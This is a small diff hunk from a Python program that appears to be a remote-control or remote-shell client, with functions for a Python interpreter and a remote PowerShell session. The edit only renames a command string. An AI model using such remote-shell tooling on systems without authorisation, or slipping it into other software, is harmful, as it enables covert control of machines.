@@ -133,7 +133,7 @@ def PythonInterpreter():
     os.remove("code.txt")
 
 def RemotePowershell():
-    send(b"remote-cmd")
+    send(b"remote-powershell")
 
     CurrentRemoteDirectory = recv(buffer).decode()
     while (True):
